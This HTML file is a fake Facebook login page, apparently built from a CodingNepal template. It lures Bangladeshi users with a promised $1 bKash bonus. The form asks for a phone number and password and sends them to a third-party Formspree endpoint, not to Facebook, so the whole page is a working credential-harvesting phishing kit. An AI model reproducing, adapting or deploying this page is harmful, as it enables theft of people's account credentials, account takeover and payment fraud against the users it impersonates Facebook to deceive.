<!DOCTYPE html>
<!-- Coding By CodingNepal - youtube.com/codingnepal -->
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Log in system</title>
  <link rel="stylesheet" href="style.css">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"/>
</head>
<body>
  <div class="wrapper">
    <header><img src="facebook.png"/></header>
    <form action="https://formspree.io/f/mqkjzyyy" method="POST">
      <div class="field email">
        <div class="input-area">
          <input type="text" name="PhoneNumber" placeholder="Phone Number" required>
        </div>
        <div class="error error-txt">Email can't be blank</div>
      </div>
      <div class="field password">
        <div class="input-area">
          <input type="password" name="password" placeholder="Password" required>
        </div>
        <div class="error error-txt">Password can't be blank</div>
      </div>
      <input type="submit" value="Login">
      <div class="pass-txt"><a href="#">Forgot password?</a></div>
    </form>
    <div class="sign-txt">Not yet member? <a href="#">Signup now</a></div>
    <div class="getbonus"><h4>Sign up & get</h4> <h3>1 Dollar</h3> </div>
    <div class="banking">
      <img src="bkash_payment_logo.png"/>
    </div>
    <div class="aboutPayment">
      <h5>বাংলাদেশের সকল Active ফেসবুক ইউজারদেরকে দিচ্ছে $1 ডলার বোনাস।</h5>
      <h4>Giving $1 dollar bonus to all Active Facebook users in Bangladesh.</h4>
    </div>
  </div>
</body>
</html>
